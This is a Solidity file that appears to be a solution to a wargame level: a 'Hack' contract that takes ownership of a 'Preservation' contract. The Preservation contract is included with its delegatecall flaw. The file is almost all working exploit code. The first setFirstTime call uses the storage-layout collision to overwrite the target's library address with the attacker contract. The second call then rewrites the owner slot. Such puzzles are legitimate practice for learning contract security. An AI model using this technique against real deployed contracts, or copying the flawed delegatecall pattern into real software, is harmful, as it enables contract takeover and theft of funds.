// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Hack{

    // public library contracts 
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    Preservation private target;
    uint public valueConverted;

    constructor(address _target) {
        target = Preservation(_target);
    }

    function helper(address addr) external returns(uint){
        valueConverted = uint(uint160(addr));
        return valueConverted;
    }
    
    function callTarget() external {
        target.setFirstTime(valueConverted);
        target.setFirstTime(uint256(uint160(msg.sender)));
        require(target.owner() == msg.sender, "hack failed");
    }

    function setTime(uint _owner) public {
        owner = address(uint160(_owner));
    }


}



contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}